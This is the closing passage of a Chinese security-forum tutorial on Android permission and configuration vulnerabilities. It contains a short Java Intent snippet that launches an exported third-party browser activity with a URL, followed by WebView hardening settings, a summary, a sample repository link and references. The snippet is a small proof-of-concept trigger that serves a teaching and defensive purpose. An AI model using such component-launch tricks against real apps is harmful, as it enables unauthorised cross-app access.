Intent contIntent = new Intent();
 
contIntent.setAction("android.intent.action.VIEW");
 
contIntent.setData(Uri.parse(url));
 
Intent intent = new Intent();
 
intent.setClassName("com.qihoo.browser","com.qihoo.browser.BrowserActivity");
 
intent.setAction("android.intent.action.VIEW");
 
intent.setData(Uri.parse(url));
 
this.startActivity(intent);

```

#### [](#（3）安全防护)（3）安全防护

通过以下设置，防止越权访问，跨域等安全问题

```
（1）将不必要导出的组件设置为不导出
（2）如果应用的需要导出包含 Webview的组件，禁止使用File域协议
 setAllowFileAccess(false)
 setAllowFileAccessFromFileURLs(false)
 setAllowUniversalAccessFromFileURLs(false)
 （3）手机厂商把手机内置的WebView与google保持更新一致
 （4）用户随时把手机的内置 webview以及使用的浏览器更新到最新版本

```

[](#六、实验总结)六、实验总结
-----------------

本文总结归纳了 Android 中的权限安全漏洞和安全配置漏洞的详细信息，并拿一些案例进行了复现讲解，本文中只是对大部分这些漏洞的一个归纳总结，里面存在的一些问题就请各位指正了，本文所用到的实验样例和相关附件，后面都会上传 github，详细大家参考：[github 地址](https://github.com/guoxuaa/Android-Vulnerability-Mining/tree/main/1.Android%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98)

[](#七、参考文献)七、参考文献
-----------------

```
第一行代码
卢璐. Android应用权限泄露漏洞检测技术研究[D].西安电子科技大学,2018.
姜维 Android应用安全防护和逆向分析
https://juejin.cn/post/6844903997669638151#heading-13
https://juejin.cn/post/6844903817662693384
https://blog.csdn.net/qq_38350635/article/details/103863992
https://ayesawyer.github.io/2019/08/21/Android-App%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/
https://www.cnblogs.com/yaq-qq/p/5843127.html
ttps://www.codeleading.com/article/67095305050/
https://github.com/nelenkov/android-backup-extractor/
https://blog.csdn.net/qq_43290288/article/details/98873651
https://segmentfault.com/a/1190000002590577
https://ayesawyer.github.io/2019/08/21/Android-App%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/

```

[【公告】看雪团队招聘安全工程师，将兴趣和工作融合在一起！看雪 20 年安全圈的口碑，助你快速成长！](https://job.kanxue.com/position-read-1104.htm)

最后于 2021-10-27 10:16 被随风而行 aa 编辑 ，原因：

[#基础理论](forum-161-1-117.htm) [#逆向分析](forum-161-1-118.htm) [#漏洞相关](forum-161-1-123.htm) [#源码分析](forum-161-1-127.htm)